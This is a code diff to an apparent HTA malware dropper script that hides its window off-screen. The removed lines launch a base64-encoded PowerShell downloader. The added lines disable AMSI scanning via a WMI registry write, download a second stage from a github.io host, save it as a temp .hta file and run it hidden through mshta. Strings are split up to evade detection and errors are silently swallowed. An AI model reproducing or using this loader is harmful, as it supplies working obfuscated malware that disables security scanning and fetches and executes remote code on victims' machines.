@@ -6,9 +6,26 @@
 window.resizeTo(0,0);
 window.moveTo(-2000,-2000);
 try{
-  var b='JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AawBhAGwAawAxADcAagBqAHIALQBiAG8AdAAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AZABpAGMAZQByAGkAZwBnAGUAcgAvAHMAdABhAGcAZQAyAC4AaAB0AG0AbAAnADsAJAB0AD0AJABlAG4AdgA6AFQARQBNAFAAKwAnAFwAcwAyAC4AaAB0AGEAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAdAA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgAG0AcwBoAHQAYQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAkAHQA';
-  var c='po'+'wer'+'she'+'ll -NoP -Exec Bypass -Enc '+b;
-  GetObject('win'+'mgmts:\\\\.\\ro'+'ot\\cim'+'v2:Win32_Pro'+'cess').Create(c,null,null,null);
+  // Kill AMSI before anything else
+  var wmi=GetObject('win'+'mgmts:\\\\.\\ro'+'ot\\ci'+'mv2');
+  wmi.Get('StdRegProv').SetDWORDValue(2147483649,'SOFTWARE\\Mi'+'crosoft\\Win'+'dows Scr'+'ipt\\Set'+'tings','Am'+'siEn'+'able',0);
+
+  // Download stage2
+  var x=new ActiveXObject('MSX'+'ML2.Ser'+'verX'+'MLHT'+'TP.6.0');
+  x.SetOption(2,13056);
+  x.open('G'+'ET','htt'+'ps://ka'+'lk17jjr-b'+'ot.gith'+'ub.io/di'+'cerigge'+'r/stage'+'2.ht'+'ml',false);
+  x.send();
+  if(x.status!=200)throw 1;
+
+  // Write to temp
+  var fso=new ActiveXObject('Scri'+'pting.Fi'+'leSyste'+'mObjec'+'t');
+  var tp=fso.GetSpecialFolder(2)+'\\s'+'2.'+'ht'+'a';
+  var tf=fso.CreateTextFile(tp,true);
+  tf.Write(x.responseText);
+  tf.Close();
+
+  // Run with mshta via ShellExecute
+  new ActiveXObject('Shel'+'l.Appl'+'icati'+'on').ShellExecute('m'+'sh'+'ta',tp,'','o'+'pen',0);
 }catch(e){}
 window.close();
 </script>
